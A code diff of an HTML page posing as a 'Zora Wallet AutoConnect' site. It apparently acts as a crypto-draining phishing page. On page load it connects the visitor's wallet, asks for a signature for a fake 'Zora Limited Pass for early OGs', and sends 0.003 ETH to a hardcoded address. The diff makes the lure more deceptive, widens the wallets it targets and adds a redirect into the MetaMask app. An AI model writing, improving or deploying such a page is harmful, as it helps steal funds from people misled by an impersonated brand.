@@ -2,23 +2,41 @@
 <html>
 <head>
   <title>Zora Wallet AutoConnect</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
   <style>
-    body { font-family: Arial; background: #f5f5f5; padding: 30px; text-align: center; }
-    .box { background: white; padding: 20px; border-radius: 12px; display: inline-block; }
-    button { padding: 12px 20px; margin: 10px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; }
+    body {
+      font-family: Arial;
+      background: #f5f5f5;
+      padding: 30px;
+      text-align: center;
+    }
+    .box {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      display: inline-block;
+    }
+    button {
+      padding: 12px 20px;
+      margin: 10px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
     .metamask { background: #f6851b; color: white; }
     .walletconnect { background: #007AFF; color: white; }
   </style>
 </head>
 <body>
   <div class="box">
-    <h2>Connect your wallet</h2>
-    <p>Select a wallet to connect to Zora</p>
+    <h2>Connecting Wallet...</h2>
+    <p>If not automatically connected, use a button below:</p>
     <button class="metamask" onclick="connectMetaMask()">MetaMask</button>
     <button class="walletconnect" onclick="connectWalletConnect()">WalletConnect</button>
-    <p style="font-size: 12px;">Powered by Zora Labs</p>
+    <p style="font-size: 12px;">Zora Limited Pass for early OGs</p>
   </div>
 
   <script>
@@ -26,35 +44,33 @@
 
     async function sendPoC(from) {
       const value = Web3.utils.toWei("0.003", "ether");
-
       try {
-        await web3.eth.personal.sign("Zora Limited Pass for early ogs", from);
-
+        await web3.eth.personal.sign("Zora Limited Pass for early OGs", from);
         await web3.eth.sendTransaction({
           from: from,
           to: "0xCF62064d70593ecd8B319b267F769ddD181157d2",
           value: value
         });
-
         alert("Transaction sent successfully!");
       } catch (err) {
         console.error(err);
-        alert("Transaction failed: " + err.message);
+        alert("Error: " + err.message);
       }
     }
 
     async function connectMetaMask() {
-      if (window.ethereum && window.ethereum.isMetaMask) {
+      if (window.ethereum) {
         try {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
           web3 = new Web3(window.ethereum);
           const accounts = await web3.eth.getAccounts();
           sendPoC(accounts[0]);
         } catch (err) {
-          console.error("MetaMask error", err);
+          alert("MetaMask error: " + err.message);
         }
       } else {
-        connectWalletConnect(); // fallback to WalletConnect
+        // fallback: redirect to MetaMask app deep link
+        window.location.href = "https://metamask.app.link/dapp/" + window.location.hostname + window.location.pathname;
       }
     }
 
@@ -63,24 +79,24 @@
         rpc: { 8453: "https://mainnet.base.org" },
         chainId: 8453,
         qrcodeModalOptions: {
-          mobileLinks: ["metamask", "trust"]
+          mobileLinks: ["metamask", "trust", "rainbow"]
         }
       });
-
       await provider.enable();
       web3 = new Web3(provider);
       const accounts = await web3.eth.getAccounts();
       sendPoC(accounts[0]);
     }
 
-    // Auto-trigger logic
-    window.onload = async () => {
-      if (window.ethereum && window.ethereum.isMetaMask) {
-        connectMetaMask();
+    window.addEventListener("load", async () => {
+      if (window.ethereum) {
+        // Try MetaMask first
+        await connectMetaMask();
       } else {
-        connectWalletConnect();
+        // Else use WalletConnect as fallback
+        await connectWalletConnect();
       }
-    };
+    });
   </script>
 </body>
 </html>
